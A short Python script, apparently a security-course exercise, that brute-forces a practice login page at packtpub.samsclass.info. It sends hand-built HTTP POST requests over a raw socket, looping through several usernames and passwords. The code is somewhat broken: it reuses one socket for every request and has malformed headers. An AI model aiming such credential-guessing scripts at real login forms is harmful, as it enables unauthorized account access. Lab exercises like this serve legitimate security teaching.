#Bruteforce a short login details
import  socket
s= socket.socket()                        
target = 'packtpub.samsclass.info'
port = input("Port Number:")
try:
        
        s.connect((target, int(port)))
        username = "admin"
        password = ""
        length = len(username) + len(password) + 5
        req1 = """ POST /http/login1.php HTTP/1.1
            Host: packtpub.samsclass.info/http/chal1.htm
            User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
            Accept-Language: en-US,en;q=0.8
            Content-Type: application/x-www-form-urlencoded
            Content-Length: 
             """
        req2 = """
                
                Origin: http://packtpub.samsclass.info
                Connection: keep-alive
                Upgrade-Insecure-Requests: 1
                Referer: http://packtpub.samsclass.info/http/login1.htm
                
                """
        username = ['bill', 'ted', 'sally', 'sue']
        password = ['passworb', 'passworc', 'password']
        for user in username:
          for pas in password:
            length = len(user) + len(pas) + 5
            req = req1 + str(length) + req2 + "u=" + user + "&p=" + pas   
            print('Sending.......')
            print(req)
            a = req.encode('utf-8')
            s.send(a)
            print(s.recv(1024))
            print(".....Received!! \n Done")
        s.close()
except socket.error as err:
        print(err)

